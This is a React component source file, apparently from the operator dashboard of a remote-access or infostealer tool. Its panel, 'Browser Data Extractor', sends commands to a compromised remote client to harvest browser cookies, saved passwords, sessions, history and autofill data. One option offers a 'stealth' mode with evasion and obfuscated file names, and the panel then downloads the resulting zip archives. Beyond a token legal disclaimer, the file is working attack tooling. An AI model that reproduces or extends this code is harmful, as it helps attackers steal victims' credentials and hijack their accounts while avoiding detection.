import React, { useState, useEffect } from 'react';
import styled from 'styled-components';
import { 
  FiShield, 
  FiDownload, 
  FiEye, 
  FiEyeOff,
  FiRefreshCw,
  FiAlertTriangle,
  FiCheckCircle,
  FiClock,
  FiHardDrive
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const BrowserExtractorContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const Header = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const Title = styled.h1`
  font-size: 20px;
  font-weight: 600;
  color: #fff;
  display: flex;
  align-items: center;
  gap: 12px;
`;

const ActionButton = styled.button`
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border: none;
  color: #000;
  padding: 12px 20px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 600;
  transition: all 0.2s;

  &:hover {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(0, 255, 136, 0.3);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }
`;

const Content = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
`;

const InfoCard = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  padding: 24px;
  margin-bottom: 20px;
  border: 1px solid #333;
`;

const InfoTitle = styled.h3`
  color: #fff;
  font-size: 18px;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  gap: 8px;
`;

const InfoText = styled.p`
  color: #888;
  line-height: 1.6;
  margin-bottom: 16px;
`;

const FeatureList = styled.ul`
  color: #ccc;
  padding-left: 20px;
  margin-bottom: 16px;

  li {
    margin-bottom: 8px;
  }
`;

const ExtractionOptions = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 20px;
  margin-bottom: 30px;
`;

const OptionCard = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  padding: 20px;
  border: 1px solid #333;
  transition: all 0.2s;

  &:hover {
    border-color: #00ff88;
    transform: translateY(-2px);
  }
`;

const OptionHeader = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 12px;
`;

const OptionIcon = styled.div`
  width: 40px;
  height: 40px;
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #000;
  font-size: 18px;
`;

const OptionTitle = styled.h4`
  color: #fff;
  font-size: 16px;
  margin: 0;
`;

const OptionDescription = styled.p`
  color: #888;
  font-size: 14px;
  margin-bottom: 16px;
`;

const OptionButton = styled.button`
  background: rgba(0, 255, 136, 0.2);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 10px 16px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  transition: all 0.2s;
  width: 100%;

  &:hover {
    background: rgba(0, 255, 136, 0.3);
  }
`;

const ResultsSection = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  padding: 20px;
  border: 1px solid #333;
`;

const ResultsTitle = styled.h3`
  color: #fff;
  font-size: 18px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 8px;
`;

const ResultItem = styled.div`
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid #333;
  border-radius: 8px;
  padding: 16px;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const ResultInfo = styled.div`
  flex: 1;
`;

const ResultName = styled.div`
  color: #fff;
  font-weight: 500;
  margin-bottom: 4px;
`;

const ResultPath = styled.div`
  color: #888;
  font-size: 12px;
  font-family: monospace;
`;

const ResultActions = styled.div`
  display: flex;
  gap: 8px;
`;

const BrowserExtractor = ({ client, socket }) => {
  const [extracting, setExtracting] = useState(false);
  const [results, setResults] = useState([]);
  const [extractionOutput, setExtractionOutput] = useState('');
  const [zipPath, setZipPath] = useState('');

  // Listen for command responses
  useEffect(() => {
    if (!socket || !client) return;

    const handleCommandResponse = (data) => {
      if (data.clientId === client.id) {
        setExtractionOutput(prev => prev + data.response + '\n');
        
        // Try to detect a ZIP file path in this chunk of output
        try {
          const text = String(data.response || '');
          // Match Windows paths ending in .zip (e.g., C:\Users\...\file.zip)
          const zipRegex = /[A-Za-z]:\\[^\n\r\t\"']*?\.zip/gi;
          const found = text.match(zipRegex);
          if (found && found.length > 0) {
            // Use the last match as the most recent archive path
            setZipPath(found[found.length - 1]);
          }
        } catch (_) {}
        
        // Check if extraction is complete
        if (data.response.includes('Browser data extracted successfully') || 
            data.response.includes('Stealth browser data extraction completed')) {
          setExtracting(false);
          toast.success('Browser data extraction completed!');
          
          // Parse the response to extract file paths
          const lines = data.response.split('\n');
          const newResults = [];
          
          for (const line of lines) {
            if (line.includes('ZIP FILE LOCATION:') || line.includes('ZIP FILE LOCATIONS:')) {
              const pathMatch = line.match(/LOCATION[^:]*:\s*(.+)/);
              if (pathMatch) {
                newResults.push({
                  name: 'Browser Data Archive',
                  path: pathMatch[1].trim(),
                  type: 'zip'
                });
              }
            }
          }
          
          if (newResults.length > 0) {
            setResults(prev => [...prev, ...newResults]);
          }
        }
      }
    };

    socket.on('commandResponse', handleCommandResponse);
    return () => socket.off('commandResponse', handleCommandResponse);
  }, [socket, client]);

  const handleExtract = (type) => {
    if (!client || !socket) return;

    setExtracting(true);
    setExtractionOutput('');
    setZipPath('');
    const command = type === 'stealth' ? 'extractbrowserstealth' : 'extractbrowser';
    
    socket.emit('executeCommand', {
      clientId: client.id,
      command: command
    });
  };

  const handleDownloadZip = () => {
    if (!socket || !client || !zipPath) return;
    socket.emit('executeCommand', {
      clientId: client.id,
      command: `download ${zipPath}`
    });
    toast.info('Download command sent for ZIP');
  };

  const handleViewPaths = () => {
    if (!client || !socket) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: 'browserpaths'
    });
  };

  if (!client) {
    return (
      <BrowserExtractorContainer>
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center', 
          height: '100%',
          color: '#666',
          fontSize: '16px'
        }}>
          Select a client to extract browser data
        </div>
      </BrowserExtractorContainer>
    );
  }

  return (
    <BrowserExtractorContainer>
      <Header>
        <Title>
          <FiShield />
          Browser Data Extractor
        </Title>
        <ActionButton onClick={handleViewPaths}>
          <FiEye />
          View Paths
        </ActionButton>
      </Header>

      <Content>
        <InfoCard>
          <InfoTitle>
            <FiAlertTriangle />
            Important Notice
          </InfoTitle>
          <InfoText>
            This tool extracts browser data including cookies, passwords, history, 
            and bookmarks from the target system. Use responsibly and in accordance 
            with applicable laws and regulations.
          </InfoText>
          <FeatureList>
            <li>Chrome, Firefox, Edge browser support</li>
            <li>Cookies and session data extraction</li>
            <li>Saved passwords and login data</li>
            <li>Browsing history and bookmarks</li>
            <li>Autofill and form data</li>
            <li>Stealth extraction with evasion techniques</li>
          </FeatureList>
        </InfoCard>

        <ExtractionOptions>
          <OptionCard>
            <OptionHeader>
              <OptionIcon>
                <FiShield />
              </OptionIcon>
              <OptionTitle>Standard Extraction</OptionTitle>
            </OptionHeader>
            <OptionDescription>
              Extract browser data using standard methods. 
              Creates a zip file with all available browser information.
            </OptionDescription>
            <OptionButton 
              onClick={() => handleExtract('standard')}
              disabled={extracting}
            >
              <FiDownload />
              {extracting ? 'Extracting...' : 'Start Extraction'}
            </OptionButton>
          </OptionCard>

          <OptionCard>
            <OptionHeader>
              <OptionIcon>
                <FiEyeOff />
              </OptionIcon>
              <OptionTitle>Stealth Extraction</OptionTitle>
            </OptionHeader>
            <OptionDescription>
              Advanced stealth extraction with evasion techniques. 
              Uses obfuscated file names and multiple storage locations.
            </OptionDescription>
            <OptionButton 
              onClick={() => handleExtract('stealth')}
              disabled={extracting}
            >
              <FiEyeOff />
              {extracting ? 'Extracting...' : 'Start Stealth Extraction'}
            </OptionButton>
          </OptionCard>
        </ExtractionOptions>

        {extractionOutput && (
          <InfoCard>
            <InfoTitle>
              <FiClock />
              Extraction Progress
            </InfoTitle>
            <div style={{ 
              background: '#000', 
              padding: '12px', 
              borderRadius: '6px', 
              fontFamily: 'monospace', 
              fontSize: '12px',
              color: '#00ff88',
              maxHeight: '200px',
              overflowY: 'auto',
              whiteSpace: 'pre-wrap'
            }}>
              {extractionOutput}
            </div>
            {zipPath && (
              <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: 12 }}>
                <ActionButton onClick={handleDownloadZip} disabled={extracting}>
                  <FiDownload />
                  Download ZIP
                </ActionButton>
              </div>
            )}
          </InfoCard>
        )}
      </Content>
    </BrowserExtractorContainer>
  );
};

export default BrowserExtractor;
